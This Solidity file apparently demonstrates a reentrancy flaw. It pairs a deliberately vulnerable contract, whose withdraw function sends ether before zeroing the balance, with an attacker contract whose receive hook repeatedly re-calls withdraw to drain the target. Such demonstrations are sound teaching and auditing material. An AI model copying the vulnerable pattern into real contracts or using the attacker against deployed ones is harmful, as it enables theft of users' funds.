// 🚨 Vulnerable Smart Contract 🚨
pragma solidity ^0.8.24;

contract ReentrancyVulnerable {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0, "No funds available");

        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer failed");

        // ❌ Balance update happens **AFTER** sending funds
        balances[msg.sender] = 0;
    }
}


// 🚨 Attacker Contract 🚨
pragma solidity ^0.8.24;

interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVulnerable public target;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw();                      // Still your money again again ...........................
        }
    }
}
